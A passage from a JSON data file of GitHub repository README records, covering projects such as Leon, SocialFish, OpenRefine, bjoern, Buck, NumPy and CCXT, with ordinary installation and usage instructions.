added\uff1a#2 #3 #11\n\n### Daily Problems\n\n- [summary](.\/daily\/)\n\n- [project](https:\/\/github.com\/azl397985856\/leetcode\/projects\/1)\n\n\n\n### Future Plans\n\n- [Complete Anki Flashcards](.\/assets\/anki\/)\n\n- [Collection of String Problem](.\/todo\/str\/)\n\n\n\n## Community Chat Groups\n\nWe're still on the early stage, so feedback from community is very welcome. For sake of reducing the costs of communication, I created some chat groups.\n\n### Telegram\n\n[http:\/\/t.me\/leetcode_intl](http:\/\/t.me\/leetcode_intl)\n\n### QQ (For China Region)\n\n![qq-group-chat](.\/assets\/qq-group-chat.png)\n\n### WeChat (For China Region)\n\n![wechat-group-chat](.\/assets\/wechat-group-chat.jpeg)\n\n(Add this bot and reply \"leetcode\" to join the group.)\n\n\n\n## Contribution\n\n- If you have any ideas, [Issues](https:\/\/github.com\/azl397985856\/leetcode\/issues) or chat in groups.\n- If you want to commit to the repository, Pull Request is welcome.\n- If you want to edit images resources in this project, [here](.\/assets\/drawio\/) lists the files that can be edited on [draw.io](https:\/\/www.draw.io\/).\n\n## Thank you\n\nA big Thank you to every [contributor](https:\/\/github.com\/azl397985856\/leetcode\/graphs\/contributors) of this project.\n\n## License\n\n[Apache-2.0](.\/LICENSE.txt)\n"},{"repo":"\/leon-ai\/leon","language":"JavaScript","readme_contents":"<p align=\"center\">\n  <a href=\"https:\/\/getleon.ai\"><img width=\"96\" src=\"https:\/\/getleon.ai\/img\/logo.svg\"><\/a><br><br>\n  <a href=\"https:\/\/www.youtube.com\/watch?v=p7GRGiicO1c\"><img width=\"512\" src=\"https:\/\/getleon.ai\/img\/1.0.0-beta.0_preview_en.png\"><\/a><br>\n<\/p>\n\n<h1 align=\"center\">Leon<\/h1>\n\n*<p align=\"center\">Your open-source personal assistant.<\/p>*\n\n<p align=\"center\">\n  <a href=\"https:\/\/github.com\/leon-ai\/leon\/blob\/develop\/LICENSE.md\"><img src=\"https:\/\/img.shields.io\/badge\/license-MIT-blue.svg?style=flat\"\/><\/a>\n  <a href=\"https:\/\/circleci.com\/gh\/leon-ai\/leon\/tree\/develop\"><img src=\"https:\/\/img.shields.io\/circleci\/project\/github\/leon-ai\/leon\/develop.svg?style=flat\"\/><\/a>\n  <a href=\"https:\/\/github.com\/leon-ai\/leon\/blob\/develop\/.github\/CONTRIBUTING.md\"><img src=\"https:\/\/img.shields.io\/badge\/PRs-welcome-brightgreen.svg?style=flat\"\/><\/a>\n<\/p>\n\n<p align=\"center\">\n  <a href=\"https:\/\/getleon.ai\">Website<\/a> ::\n  <a href=\"https:\/\/docs.getleon.ai\">Documentation<\/a> ::\n  <a href=\"https:\/\/roadmap.getleon.ai\">Roadmap<\/a> ::\n  <a href=\"https:\/\/github.com\/leon-ai\/leon\/blob\/develop\/.github\/CONTRIBUTING.md\">Contributing<\/a> ::\n  <a href=\"https:\/\/blog.getleon.ai\/the-story-behind-leon\/\">Story<\/a>\n<\/p>\n\n---\n\n**Note**\n> I'm focusing on another project, so the progress of this repo might slow down for a while. You can [subscribe here](https:\/\/www.producthunt.com\/upcoming\/2aud-io) to be part of the first ones.\n\n## Introduction\n\nLeon is an **open-source personal assistant** who can live **on your server**.\n\nHe **does stuff** when you **ask him for**.\n\nYou can **talk to him** and he can **talk to you**.\nYou can also **text him** and he can also **text you**.\nIf you want to, Leon can communicate with you by being **offline to protect your privacy**.\n\n### Why?\n\n> 1. If you are a developer (or not), you may want to build many things that could help in your daily life.\n> Instead of building a dedicated project for each of those ideas, Leon can help you with his\n> packages\/modules (skills) structure.\n> 2. With this generic structure, everyone can create their own modules and share them with others.\n> Therefore there is only one core (to rule them all).\n> 3. Leon uses AI concepts, which is cool.\n> 4. Privacy matters, you can configure Leon to talk with him offline. You can already text with him without any third party services.\n> 5. Open source is great.\n\n### What is this repository for?\n\n> This repository contains the following nodes of Leon:\n> - The server\n> - The packages\/modules\n> - The web app\n> - The hotword node\n\n### What is Leon able to do?\n\n> Today, the most interesting part is about his core and the way he can scale up. He is pretty young but can easily scale to have new features (packages\/modules).\n> You can find what he is able to do by browsing the [packages list](https:\/\/github.com\/leon-ai\/leon\/tree\/develop\/packages).\n\nSounds good for you? Then let's get started!\n\n## Getting Started\n\n### Prerequisites\n\n- [Node.js](https:\/\/nodejs.org\/) >= 10\n- npm >= 5\n- [Python](https:\/\/www.python.org\/downloads\/) >= 3\n- [Pipenv](https:\/\/docs.pipenv.org)\n- Supported OSes: Linux, macOS and Windows\n\nTo install these prerequisites, you can follow the [How To section](https:\/\/docs.getleon.ai\/how-to\/) of the documentation.\n\n### Installation\n\n```sh\n# Clone the repository (stable branch)\ngit clone -b master https:\/\/github.com\/leon-ai\/leon.git leon\n# OR download the latest release at: https:\/\/github.com\/leon-ai\/leon\/releases\/latest\n\n# Go to the project root\ncd leon\n\n# Install\nnpm install\n```\n\n### Usage\n\n```sh\n# Check the setup went well\nnpm run check\n\n# Build\nnpm run build\n\n# Run\nnpm start\n\n# Go to http:\/\/localhost:1337\n# Hooray! Leon is running\n```\n\n### Docker Installation\n\n```sh\n# Build\nnpm run docker:build\n\n# Run on Linux or macOS\nnpm run docker:run\n\n# Run on Windows (you can replace \"UTC\" by your time zone)\ndocker run -e TZ=UTC -p 1337:1337 -it leonai\/leon\n\n# Go to http:\/\/localhost:1337\n# Hooray! Leon is running\n```\n\n## Documentation\n\nFor full documentation, visit [docs.getleon.ai](https:\/\/docs.getleon.ai).\n\n## Roadmap\n\nTo know what is going on, follow [roadmap.getleon.ai](https:\/\/roadmap.getleon.ai).\n\n## Contributing\n\nIf you have an idea for improving Leon, do not hesitate.\n\n**Leon needs open source to live**, the more modules he has, the more skillful he becomes.\n\n## The Story Behind Leon\n\nYou'll find a write-up on this [blog post](https:\/\/blog.getleon.ai\/the-story-behind-leon\/).\n\n## Stay Tuned\n- [Newsletter](https:\/\/getleon.ai)\n- [Blog](https:\/\/blog.getleon.ai)\n- [GitHub issues](https:\/\/github.com\/leon-ai\/leon\/issues)\n- [Twitter](https:\/\/twitter.com\/louistiti_fr)\n- [#LeonAI](https:\/\/twitter.com\/hashtag\/LeonAI)\n\n## Author\n**Louis Grenard** ([@louistiti_fr](https:\/\/twitter.com\/louistiti_fr))\n\n## Donate\n\nYou can also contribute by [buying me a fruit juice](https:\/\/donate.getleon.ai).\n\n## License\n[MIT License](https:\/\/github.com\/leon-ai\/leon\/blob\/develop\/LICENSE.md)\n\nCopyright (c) 2019-present, Louis Grenard <louis.grenard@gmail.com>\n\n## Cheers!\n![Cheers!](https:\/\/github.githubassets.com\/images\/icons\/emoji\/unicode\/1f37b.png \"Cheers!\")\n"},{"repo":"\/UndeadSec\/SocialFish","language":"CSS","readme_contents":"<p align=\"center\">\n  <img src=\"https:\/\/raw.githubusercontent.com\/UndeadSec\/SocialFishMobile\/master\/content\/logo.png\" width=\"200\"\/>\n<\/a><\/p>\n<h1 align=\"center\">SocialFish<\/h1>\n\nAre you looking for SF's mobile controller? [UndeadSec\/SocialFishMobile][sf-mobile]\n\nAre you looking for SF's old version(**Ngrok integrated**) ? [UndeadSec\/SociaFish\/...\/sharkNet][sf-sharknet] \n#### SETUP AND RUNNING\n\nVisit the [wiki](<https:\/\/github.com\/UndeadSec\/SocialFish\/wiki>) for more details.\n\nSetup instructions [here](<https:\/\/github.com\/UndeadSec\/SocialFish\/wiki\/Setting-Up-SocialFish>).\n\n![Screenshot](https:\/\/raw.githubusercontent.com\/UndeadSec\/SocialFishMobile\/master\/content\/screen.png)\n\n#### MAINTAINERS\n- **Alisson Moretto**, Twitter: [@A1S0N_][tw-alisson], GitHub: [@A1S0N][git-alisson]\n- **Vandr\u00e9 Augusto**, Twitter: [@dr1nKoRdi3][tw-drink], GitHub: [@dr1nK0Rdi3][git-drink]\n\n#### DOCS\n- **Fernando Bellincanta**, Twitter: [@ErvalhouS][tw-fernando], GitHub: [@ErvalhouS][git-fernando]\n\n### DISCLAIMER\n\nTO BE USED FOR EDUCATIONAL PURPOSES ONLY\n\nThe use of the SocialFish is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program.\n\n\"DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\nFOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\nDAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\nSERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\nCAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\nOR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\"\nTaken from [LICENSE](LICENSE).\n\n# CONTRIBUTING\n[![Open Source Helpers](https:\/\/www.codetriage.com\/undeadsec\/socialfish\/badges\/users.svg)](https:\/\/www.codetriage.com\/undeadsec\/socialfish)\n\nWe encourage you to contribute to SocialFish! Please check out the [Contributing to SocialFish](https:\/\/github.com\/UndeadSec\/SocialFish\/blob\/master\/CONTIBUTING.md) guide for guidelines about how to proceed. Join us!\n\n# CONTRIBUTOR CODE OF CONDUCT\n\nThis project adheres to No Code of Conduct. We are all adults. We accept anyone's contributions. Nothing else matters.\n\nFor more information please visit the [No Code of Conduct homepage](https:\/\/github.com\/domgetter\/NCoC).\n\n[\/\/]: # (links references)\n\n[tw-alisson]: <https:\/\/twitter.com\/A1S0N_>\n[git-alisson]: <https:\/\/github.com\/A1S0N>\n[tw-drink]: <https:\/\/twitter.com\/Dr1nkOrdi3>\n[git-drink]: <https:\/\/github.com\/dr1nk0rdi3>\n[sf-mobile]: <https:\/\/github.com\/UndeadSec\/SocialFishMobile>\n[git-tiago]: <https:\/\/github.com\/tiagorlampert>\n[git-fernando]: <https:\/\/github.com\/ErvalhouS>\n[tw-fernando]: <https:\/\/twitter.com\/ErvalhouS>\n[sf-sharknet]: <https:\/\/github.com\/UndeadSec\/SocialFish\/releases\/tag\/sharkNet>\n"},{"repo":"\/OpenRefine\/OpenRefine","language":"Java","readme_contents":"# OpenRefine\n\n[![Join the chat at https:\/\/gitter.im\/OpenRefine\/OpenRefine](https:\/\/badges.gitter.im\/OpenRefine\/OpenRefine.svg)](https:\/\/gitter.im\/OpenRefine\/OpenRefine?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge) [![Build Status](https:\/\/travis-ci.org\/OpenRefine\/OpenRefine.svg?branch=master)](https:\/\/travis-ci.org\/OpenRefine\/OpenRefine) [![Coverage Status](https:\/\/coveralls.io\/repos\/github\/OpenRefine\/OpenRefine\/badge.svg?branch=coveralls)](https:\/\/coveralls.io\/github\/OpenRefine\/OpenRefine?branch=coveralls) [![Translation progress](https:\/\/hosted.weblate.org\/widgets\/openrefine\/-\/svg-badge.svg)](https:\/\/hosted.weblate.org\/engage\/openrefine\/?utm_source=widget)\n\nOpenRefine is a Java-based power tool that allows you to load data, understand it,\nclean it up, reconcile it, and augment it with data coming from\nthe web. All from a web browser and the comfort and privacy of your own computer.\n\n[<img src=\"https:\/\/github.com\/OpenRefine\/OpenRefine\/blob\/master\/graphics\/icon\/open-refine-320px.png\" align=\"right\">](http:\/\/openrefine.org)\n\nDownload\n-----------------------\n* [OpenRefine Releases](https:\/\/github.com\/OpenRefine\/OpenRefine\/releases)\n\nRun from source\n------------------\nIf you have cloned this repository to your computer, you can run OpenRefine with:\n* `.\/refine` on Mac OS and Linux\n* `refine.bat` on Windows\n\nThis requires JDK 8 and Apache Maven.\n\nDocumentation and Videos\n-------------------------\n* [Documentation Wiki](https:\/\/github.com\/OpenRefine\/OpenRefine\/wiki\/Documentation-For-Users)\n* [FAQ](https:\/\/github.com\/OpenRefine\/OpenRefine\/wiki\/FAQ)\n* [Official Website and tutorial videos](http:\/\/openrefine.org)\n\nContributing to the project\n---------------------------\n* [Developers Guide & Architecture](https:\/\/github.com\/OpenRefine\/OpenRefine\/wiki\/Documentation-For-Developers)\n* [Contributing Guide](https:\/\/github.com\/OpenRefine\/OpenRefine\/blob\/master\/CONTRIBUTING.md)\n* [Project Governance](https:\/\/github.com\/OpenRefine\/OpenRefine\/blob\/master\/GOVERNANCE.md)\n\nContact us\n----------\n* [Mailing List](https:\/\/groups.google.com\/forum\/#!forum\/openrefine)\n* [Twitter](http:\/\/www.twitter.com\/openrefine)\n\nLicensing and legal issues\n--------------------------\nOpenRefine is open source software and is licensed under the BSD license\nlocated in the [LICENSE.txt](LICENSE.txt). See the folder `licenses` for information on open source\nlibraries that OpenRefine depends on.\n\nCredits\n-------\nThis software was created by Metaweb Technologies, Inc. and originally written\nand conceived by David Huynh <dfhuynh@google.com>. Metaweb Technologies, Inc.\nwas acquired by Google, Inc. in July 2010 and the product was renamed Google Refine.\nIn October 2012, it was renamed OpenRefine as it transitioned to a \ncommunity-supported product.\n\nSee `AUTHORS.md` for the list of OpenRefine contributors.\n"},{"repo":"\/Show-Me-the-Code\/python","language":"HTML","readme_contents":"python\n======\n\nShow Me the Code Python version.\n\n2015\u5e748\u670810\u65e5\u66f4\u65b0\uff1a\n\u3010\u6ce8\u3011Pull Request \u8bf7\u63d0\u4ea4\u4f60\u4e2a\u4eba\u7684\u4ed3\u5e93 URL \u94fe\u63a5\u5730\u5740\u3002\n\n### How to Add your solutions:\n\n  * Fork this repo.\n  * Create a folder named with your github name.\n  * Create a folder named the problem num.\n  * Add your solution in the folder.\n\nFor example, if you wanna add a solution for problem 0001, you should do like this:\n\n  * Fork `Show-Me-the-Code\/python`.\n  * git clone `YOUR_REPO_URL SOME_DIR`.\n  * cd `SOME_DIR`.\n  * mkdir `YOUR_GITHUB_USER_NAME`.\n  * cd `YOU_GITHUB_USER_NAME`.\n  * mkdir `0001`.\n  * cd `0001`.\n  * and the write some code & test it.\n\nIf all these steps done, send us an pull request. After we accept your request, we'll invite you to this group.\n"},{"repo":"\/jonashaag\/bjoern","language":"C","readme_contents":"bjoern: Fast And Ultra-Lightweight HTTP\/1.1 WSGI Server\n=======================================================\n\n.. image:: https:\/\/badges.gitter.im\/Join%20Chat.svg\n   :alt: Join the chat at https:\/\/gitter.im\/jonashaag\/bjoern\n   :target: https:\/\/gitter.im\/jonashaag\/bjoern?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge\n\nA screamingly fast, ultra-lightweight WSGI_ server for CPython 2 and CPython 3,\nwritten in C using Marc Lehmann's high performance libev_ event loop and\nRyan Dahl's http-parser_.\n\nWhy It's Cool\n~~~~~~~~~~~~~\nbjoern is the *fastest*, *smallest* and *most lightweight* WSGI server out there,\nfeaturing\n\n* ~ 1000 lines of C code\n* Memory footprint ~ 600KB\n* Python 2 and Python 3 support (thanks @yanghao!)\n* Single-threaded and without coroutines or other crap\n* Can bind to TCP `host:port` addresses and Unix sockets (thanks @k3d3!)\n* Full persistent connection (\"*keep-alive*\") support in both HTTP\/1.0 and 1.1,\n  including support for HTTP\/1.1 chunked responses\n\nInstallation\n~~~~~~~~~~~~\n``pip install bjoern``. See `wiki <https:\/\/github.com\/jonashaag\/bjoern\/wiki\/Installation>`_ for details.\n\nUsage\n~~~~~\n::\n\n   # Bind to TCP host\/port pair:\n   bjoern.run(wsgi_application, host, port)\n\n   # TCP host\/port pair, enabling SO_REUSEPORT if available.\n   bjoern.run(wsgi_application, host, port, reuse_port=True)\n\n   # Bind to Unix socket:\n   bjoern.run(wsgi_application, 'unix:\/path\/to\/socket')\n\n   # Bind to abstract Unix socket: (Linux only)\n   bjoern.run(wsgi_application, 'unix:@socket_name')\n\n   # Enable statsd metrics. See instrumentation.md for details.\n   bjoern.run(wsgi_application, host, port, statsd=...)\n\nAlternatively, the mainloop can be run separately::\n\n   bjoern.listen(wsgi_application, host, port)\n   bjoern.run()\n\n   # With metrics. See instrumentation.md for details.\n   bjoern.listen(wsgi_application, host, port)\n   bjoern.run(statsd=...)\n\nYou can also simply pass a Python socket(-like) object. Note that you are responsible\nfor initializing and cleaning up the socket in that case. ::\n\n   bjoern.server_run(socket_object, wsgi_application)\n   bjoern.server_run(filedescriptor_as_integer, wsgi_application)\n\n   # This needs manual compilation with `WANT_STATSD=yes`\n   bjoern.server_run(socket_object, wsgi_application, enable_statsd=True)\n\n.. _WSGI:         http:\/\/www.python.org\/dev\/peps\/pep-0333\/\n.. _libev:        http:\/\/software.schmorp.de\/pkg\/libev.html\n.. _http-parser:  https:\/\/github.com\/joyent\/http-parser\n"},{"repo":"\/facebook\/buck","language":"Java","readme_contents":"Buck\n====\n\nBuck is a build tool. To see what Buck can do for you,\ncheck out the documentation at <http:\/\/buck.build\/>.\n\n[![Build Status](https:\/\/travis-ci.org\/facebook\/buck.svg)](https:\/\/travis-ci.org\/facebook\/buck) [![Build status](https:\/\/ci.appveyor.com\/api\/projects\/status\/v64qh0cd2cp9uto8\/branch\/master?svg=true)](https:\/\/ci.appveyor.com\/project\/Facebook\/buck\/branch\/master)\n\nInstallation\n------------\n\nFirst, clone the Buck repository:\n\n    git clone --depth 1 https:\/\/github.com\/facebook\/buck.git\n    cd buck\n\nSince Buck is used to build Buck, the initial build process involves 2 phases:\n\n##### 1. Bootstrap Buck with ant\n\n    git clone --depth 1 https:\/\/github.com\/facebook\/buck.git\n    cd buck\n    ant\n\n##### 2. Use bootstrapped version of Buck to build Buck:\n\n    .\/bin\/buck build --show-output buck\n    # output will contain something like\n    # \/\/programs:buck buck-out\/gen\/programs\/buck.pex\n    buck-out\/gen\/programs\/buck.pex --help\n\n##### Prebuilt buck binaries\n\nPre-built binaries of buck for any buck `sha` can be downloaded from `https:\/\/jitpack.io\/com\/github\/facebook\/buck\/<sha>\/buck-<sha>.pex`. The very first time a version of buck is requested, it is built via [jitpack](https:\/\/jitpack.io\/). As a result, it could take a few minutes for this initial binary to become available. Every subsequent request will just serve the built artifact directly. This functionality is available for any fork of buck as well, so you can fetch `https:\/\/jitpack.io\/com\/github\/<github-user-or-org>\/buck\/<sha>\/buck-<sha>.pex`\n\nFeature Deprecation\n-------------------\n\nBuck tries to move fast with respect to its internals. However, for user facing features (build rules, command line interface, etc), the Buck team tries to have a graceful deprecation process. Note that this generally applies only to documented functionality, or functionality that is less documented, but appears to be in wide use. That process is:\n\n- An issue is opened on Github suggesting what will be deprecated, and when it will be removed. For larger features that are deprecated, there may be a period when the default is the new setting, and the old behavior may only be used with a configuration change.\n  - [In-progress deprecation issues](https:\/\/github.com\/facebook\/buck\/issues?utf8=%E2%9C%93&q=is%3Aopen+label%3Aannouncement+label%3Adeprecation) are tagged with 'announcement' and 'deprecation'\n- A change is submitted to Buck that puts the old behavior behind a configuration flag and sets the default to the old behavior. These flags can be found at https:\/\/buck.build\/concept\/buckconfig.html#incompatible.\n- For larger features, a change eventually is put in place that sets the default to the new behavior. e.g. when Skylark becomes the default build file parser.\n- When the removal date is reached, a change is submitted to remove the feature. At this point, the configuration value will still parse, but will not be used by Buck internally.\n\nLicense\n-------\nApache License 2.0\n"},{"repo":"\/caspartse\/QQ-Groups-Spider","language":"CSS","readme_contents":"# QQ-Groups-Spider (v0.3.0)\n\nQQ Groups Spider\uff08QQ \u7fa4\u722c\u866b\uff09\n\n\u6279\u91cf\u6293\u53d6 QQ \u7fa4\u4fe1\u606f\uff0c\u5305\u62ec\u7fa4\u540d\u79f0\u3001\u7fa4\u53f7\u3001\u7fa4\u4eba\u6570\u3001\u7fa4\u4e3b\u3001\u5730\u57df\u3001\u5206\u7c7b\u3001\u6807\u7b7e\u3001\u7fa4\u7b80\u4ecb\u7b49\u5185\u5bb9\uff0c\u8fd4\u56de XLS \/ CSV \/ JSON \u7ed3\u679c\u6587\u4ef6\u3002\n\n\n## \u4ee3\u7801\u8bf4\u660e\n\n### \u6d4b\u8bd5\u73af\u5883\n\n* BunsenLabs GNU\/Linux 8.9 (Hydrogen)\n* Windows XP Service Pack 3 (on VirtualBox)\n* Python (2.7)\n\n### \u7b2c\u4e09\u65b9\u5e93\u652f\u6301\n\n* [bottle](http:\/\/bottlepy.org\/)\n* [requests](http:\/\/python-requests.org)\n* [simplejson](https:\/\/github.com\/simplejson\/simplejson)\n* [pyexcel-xls](https:\/\/github.com\/pyexcel\/pyexcel-xls)\n* [unicodecsv](https:\/\/github.com\/jdunck\/python-unicodecsv)\n\n### \u672c\u5730\u8fd0\u884c\n\n``` $ python app.py```\n\n### SAE \u4e0a\u8fd0\u884c\n\n\u6309\u7167 [https:\/\/www.sinacloud.com\/doc\/sae\/python\/tutorial.html#bottle](https:\/\/www.sinacloud.com\/doc\/sae\/python\/tutorial.html#bottle) \u8bf4\u660e\u914d\u7f6e\u5373\u53ef\u3002\n\n\n## Demo\n\n### \u5728\u7ebf\u6f14\u793a\n\n[http:\/\/kagent.applinzi.com\/qqun](http:\/\/kagent.applinzi.com\/qqun)\n\n### \u622a\u56fe\u793a\u4f8b\n\n![](https:\/\/raw.githubusercontent.com\/caspartse\/QQ-Groups-Spider\/master\/screenshots\/screenshot_01.png)\n\n![](https:\/\/raw.githubusercontent.com\/caspartse\/QQ-Groups-Spider\/master\/screenshots\/screenshot_02.png)\n\n\n## \u81f4\u8c22\n\n@\u5c0f\u6728\u54e51\n\n\n## \u66f4\u65b0\u65e5\u5fd7\n\n* 2017-12-31  v0.3.0 \u652f\u6301\u591a\u4e2a\u5173\u952e\u8bcd\uff08\u8fd4\u56de zip \u538b\u7f29\u5305\uff09\uff1b\u9875\u9762\u4f18\u5316\uff1b\uff08\u6682\u65f6\uff09\u79fb\u9664 XlsxWriter \u6a21\u5757\u3002\n* 2017-07-27  v0.2.0 \u66f4\u6362\u65b0\u63a5\u53e3\uff1b\u4f18\u5316\u6a21\u677f\u9875\u9762\uff1b\u589e\u52a0\u7fa4\u4e0a\u9650\u3001\u5730\u57df\u3001\u5206\u7c7b\u3001\u6807\u7b7e\u7b49\u5b57\u6bb5\uff1b\u65b0\u589e\u5bfc\u51fa JSON \u683c\u5f0f\u3002\n* 2016-02-19  v0.1.2 \u66f4\u65b0\u4e8c\u7ef4\u7801\u9a8c\u8bc1\u53c2\u6570\u3002\n* 2016-08-19  v0.1.1 \u6539\u5584\u4ee3\u7801\u903b\u8f91\uff1b\u52a0\u5165 XlsxWriter \u6a21\u5757\uff1b\u589e\u52a0\u672c\u5730\u8fd0\u884c\u652f\u6301\u3002\n* 2016-07-23  v0.1.0 \u521d\u59cb\u5316\u3002\n"},{"repo":"\/numpy\/numpy","language":"C","readme_contents":"# <img alt=\"NumPy\" src=\"https:\/\/cdn.rawgit.com\/numpy\/numpy\/master\/branding\/icons\/numpylogo.svg\" height=\"60\">\n\n[![Travis](https:\/\/img.shields.io\/travis\/numpy\/numpy\/master.svg?label=Travis%20CI)](\n    https:\/\/travis-ci.org\/numpy\/numpy)\n[![Azure](https:\/\/dev.azure.com\/numpy\/numpy\/_apis\/build\/status\/azure-pipeline%20numpy.numpy)](\n    https:\/\/dev.azure.com\/numpy\/numpy\/_build\/latest?definitionId=5)\n[![codecov](https:\/\/codecov.io\/gh\/numpy\/numpy\/branch\/master\/graph\/badge.svg)](\n    https:\/\/codecov.io\/gh\/numpy\/numpy)\n\nNumPy is the fundamental package needed for scientific computing with Python.\n\n- **Website:** https:\/\/www.numpy.org\n- **Documentation:** https:\/\/docs.scipy.org\/\n- **Mailing list:** https:\/\/mail.python.org\/mailman\/listinfo\/numpy-discussion\n- **Source code:** https:\/\/github.com\/numpy\/numpy\n- **Contributing:** https:\/\/www.numpy.org\/devdocs\/dev\/index.html\n- **Bug reports:** https:\/\/github.com\/numpy\/numpy\/issues\n- **Report a security vulnerability:** https:\/\/tidelift.com\/docs\/security\n\nIt provides:\n\n- a powerful N-dimensional array object\n- sophisticated (broadcasting) functions\n- tools for integrating C\/C++ and Fortran code\n- useful linear algebra, Fourier transform, and random number capabilities\n\nTesting:\n\n- NumPy versions &ge; 1.15 require `pytest`\n- NumPy versions &lt; 1.15 require `nose`\n\nTests can then be run after installation with:\n\n    python -c 'import numpy; numpy.test()'\n\n\nCall for Contributions\n----------------------\n\nNumPy appreciates help from a wide range of different backgrounds.\nWork such as high level documentation or website improvements are valuable\nand we would like to grow our team with people filling these roles.\nSmall improvements or fixes are always appreciated and issues labeled as easy\nmay be a good starting point.\nIf you are considering larger contributions outside the traditional coding work,\nplease contact us through the mailing list.\n\n\n[![Powered by NumFOCUS](https:\/\/img.shields.io\/badge\/powered%20by-NumFOCUS-orange.svg?style=flat&colorA=E1523D&colorB=007D8A)](https:\/\/numfocus.org)\n"},{"repo":"\/ccxt\/ccxt","language":"JavaScript","readme_contents":"# CCXT \u2013 CryptoCurrency eXchange Trading Library\n\n[![Build Status](https:\/\/travis-ci.org\/ccxt\/ccxt.svg?branch=master)](https:\/\/travis-ci.org\/ccxt\/ccxt) [![npm](https:\/\/img.shields.io\/npm\/v\/ccxt.svg)](https:\/\/npmjs.com\/package\/ccxt) [![PyPI](https:\/\/img.shields.io\/pypi\/v\/ccxt.svg)](https:\/\/pypi.python.org\/pypi\/ccxt) [![NPM Downloads](https:\/\/img.shields.io\/npm\/dm\/ccxt.svg)](https:\/\/www.npmjs.com\/package\/ccxt) [![Gitter](https:\/\/badges.gitter.im\/ccxt-dev\/ccxt.svg)](https:\/\/gitter.im\/ccxt-dev\/ccxt?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge) [![Supported Exchanges](https:\/\/img.shields.io\/badge\/exchanges-123-blue.svg)](https:\/\/github.com\/ccxt\/ccxt\/wiki\/Exchange-Markets) [![Open Collective](https:\/\/opencollective.com\/ccxt\/backers\/badge.svg)](https:\/\/opencollective.com\/ccxt)\n[![Twitter Follow](https:\/\/img.shields.io\/twitter\/follow\/ccxt_official.svg?style=social&label=CCXT)](https:\/\/twitter.com\/ccxt_official)\n\nA JavaScript \/ Python \/ PHP library for cryptocurrency trading and e-commerce with support for many bitcoin\/ether\/altcoin exchange markets and merchant APIs.\n\n### [Install](#install) \u00b7 [Usage](#usage) \u00b7 [Manual](https:\/\/github.com\/ccxt\/ccxt\/wiki) \u00b7 [FAQ](https:\/\/github.com\/ccxt\/ccxt\/wiki\/FAQ) \u00b7 [Examples](https:\/\/github.com\/ccxt\/ccxt\/tree\/master\/examples) \u00b7 [Contributing](https:\/\/github.com\/ccxt\/ccxt\/blob\/master\/CONTRIBUTING.md) \u00b7 [Social](#social)\n\nThe **CCXT** library is used to connect and trade with cryptocurrency exchanges and payment processing services worldwide. It provides quick access to market data for storage, analysis, visualization, indicator development, algorithmic trading, strategy backtesting, bot programming, and related software engineering.\n\nIt is intended to be used by **coders, developers, technically-skilled traders, data-scientists and financial analysts** for building trading algorithms.\n\nCurrent feature list:\n\n- support for many cryptocurrency exchanges \u2014 more coming soon\n- fully implemented public and private APIs\n- optional normalized data for cross-exchange analytics and arbitrage\n- an out of the box unified API that is extremely easy to integrate\n- works in Node 7.6+, Python 2 and 3, PHP 5.4+, and web browsers\n\n## Sponsored Promotion\n\nWant this place? Contact us: info@ccxt.trade\n\n[![Placehodler](https:\/\/user-images.githubusercontent.com\/1707\/48204972-43569e00-e37c-11e8-9cf3-b86e3dc19ee9.png)](https:\/\/ccxt.trade\/advertise\/)\n\n## See Also\n\n- <sub>[![Nomics API](https:\/\/user-images.githubusercontent.com\/1294454\/53875704-2ffbcc80-4016-11e9-828b-337409955609.png)](https:\/\/p.nomics.com\/cryptocurrency-bitcoin-api)<\/sub>&nbsp; **[Nomics API](https:\/\/p.nomics.com\/cryptocurrency-bitcoin-api)**&nbsp;&mdash;&nbsp;enterprise-grade [crypto market cap & pricing data](https:\/\/nomics.com) API for your fund, smart contract, or app.\n- <sub>[![Quadency](https:\/\/user-images.githubusercontent.com\/1294454\/69334382-a0618100-0c6b-11ea-9ba9-40aa97440cfa.png)](https:\/\/quadency.com?utm_source=ccxt)<\/sub>&nbsp; **[Quadency](https:\/\/quadency.com?utm_source=ccxt)**&nbsp;&mdash;&nbsp;professional crypto terminal, algo trading, and unified streaming APIs.\n- <sub>[![TabTrader](https:\/\/user-images.githubusercontent.com\/1294454\/66755907-9c3e8880-eea1-11e9-846e-0bff349ceb87.png)](https:\/\/tab-trader.com\/?utm_source=ccxt)<\/sub>&nbsp; **[TabTrader](https:\/\/tab-trader.com\/?utm_source=ccxt)**&nbsp;&mdash;&nbsp;trading on all exchanges in one app. Avaliable on [Android](https:\/\/play.google.com\/store\/apps\/details?id=com.tabtrader.android&referrer=utm_source%3Dccxt) and [iOS](https:\/\/itunes.apple.com\/app\/apple-store\/id1095716562?mt=8).\n- <sub>[![CoinFabrik](https:\/\/user-images.githubusercontent.com\/1294454\/69568442-a8535500-0fcc-11ea-981d-9422a92bbc23.png)](https:\/\/www.coinfabrik.com\/#contact_us)<\/sub>&nbsp; **[CoinFabrik](https:\/\/www.coinfabrik.com\/#contact_us)**&nbsp;&mdash;&nbsp;development, research, and security audit for cryptocurrency and blockchain applications.\n\n\n## Certified Cryptocurrency Exchanges\n\n\n|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;logo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;                                                                                     | id        | name                                                                 | ver | doc                                                                                | certified                                                                                                                  